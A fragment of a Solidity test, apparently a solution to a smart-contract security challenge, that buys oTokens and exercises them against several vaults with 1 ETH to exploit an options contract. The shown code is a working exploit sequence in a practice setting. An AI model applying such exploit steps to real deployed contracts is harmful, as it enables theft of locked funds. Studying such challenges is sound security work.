...
contract Testing is Test {
    ...
    function testChallengeExploit() public {
        ...
        // I have 500 USDC
        // 1 ETH = 2000 USDC, 1h expiry
        // 100 USDC premium for 1 oToken
        // createVault -> addCollateral( 2000 USDC ) -> deposit oTokens on OptionsMarket
        // vault oTokens: 1 oToken | oTokensIssued: 1 oToken | collateral: 2000 USDC
        // in some point, I use 1 ETH

        // buy 5 oTokens from OptionsMarket
        usdc.approve(address(optionsMarket),500e18);
        optionsMarket.purchase(5e18);
        // exercise with 1 ETH
        address[] memory vaults = new address[](5);
        for (uint i = 0; i < 5; i++) {
            vaults[i] = addresses[i];
        }
        optionsContract.exercise{value: 1 ether}(5e18, vaults);
